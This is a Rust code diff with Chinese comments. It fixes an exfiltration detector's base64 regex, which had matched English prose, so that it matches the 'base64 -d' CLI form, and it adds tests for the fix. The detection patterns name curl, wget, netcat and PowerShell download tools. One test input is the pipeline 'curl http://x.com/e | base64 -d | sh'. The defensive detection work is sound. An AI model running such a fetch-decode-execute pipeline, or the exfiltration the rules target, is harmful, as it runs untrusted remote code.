@@ -215,7 +215,13 @@ impl DataExfiltrationDetector {
         let raw: Vec<(&str, &str)> = vec![
             ("exfil_curl", r"(?i)(curl|wget)\s+.*https?://"),
             ("exfil_netcat", r"(?i)nc\s+-[elp]\s+"),
-            ("exfil_base64", r"(?i)base64\s+(encode|decode)"),
+            // ⛔ 原先是 `base64\s+(encode|decode)` —— **`base64(1)` 根本没有
+            //   `encode`/`decode` 子命令**（那是 Python 的用法）。实测 36 MiB 真实
+            //   语料里它的 10 次命中有 9 次是英文散文 `format!("base64 decode failed")`
+            //   ⇒ **匹配散文、漏掉它本来要拦的 CLI 形态**。
+            //   GNU coreutils 的真实形态是 `-d/--decode` 与 `-w/--wrap`；
+            //   解码管道（`curl x | base64 -d | sh`）才是真正要拦的东西。
+            ("exfil_base64", r"(?i)\bbase64\s+-{1,2}(?:d\b|decode|input)"),
             ("exfil_dns", r"(?i)dig\s+\+[a-z]+\s+"),
             ("exfil_powershell", r"(?i)Invoke-WebRequest|Invoke-RestMethod"),
             ("exfil_python_req", r"(?i)(requests\.get|urllib\.request)\s*\("),
@@ -517,5 +523,36 @@ mod tests {
             Regex::new(r"https?://[^\s]+").is_ok(),
             "URL 密度正则写坏了 ⇒ 生产会静默退化成永不匹配（漏检）"
         );
+    }
+
+    /// ⭐ **\`exfil_base64\` 的正则原先是写错的**，不是阈值问题。
+    ///
+    /// \`base64(1)\`（GNU coreutils）**没有** \`encode\`/\`decode\` 子命令** ——
+    /// 那是 Python 的用法。实测 36 MiB 真实语料里它的 10 次命中有 **9 次是英文
+    /// 散文**（\`format!("base64 decode failed")\`）⇒ **匹配散文、漏掉 CLI 形态**。
+    ///
+    /// 真实要拦的是解码管道：\`curl x | base64 -d | sh\`。
+    #[test]
+    fn base64_rule_matches_the_cli_form_not_english_prose() {
+        let d = DataExfiltrationDetector::new();
+        let ctx = ctx();
+        // 真实 CLI 形态：必须命中
+        for cmd in ["base64 -d payload.b64", "base64 --decode payload.b64",
+                    "curl http://x.com/e | base64 -d | sh"] {
+            let r = d.validate(&ctx, cmd);
+            assert!(
+                r.violations.iter().any(|v| v.rule_id == "exfil_base64"),
+                "base64 CLI 形态必须命中：{cmd}"
+            );
+        }
+        // 英文散文：不得再命中（这是修正的目的）
+        for prose in ["base64 decode failed", "the base64 encode step",
+                      "format!(\"base64 decode failed\")"] {
+            let r = d.validate(&ctx, prose);
+            assert!(
+                !r.violations.iter().any(|v| v.rule_id == "exfil_base64"),
+                "英文散文被 base64 规则误判（这正是被修掉的缺陷）：{prose}"
+            );
+        }
     }
 }
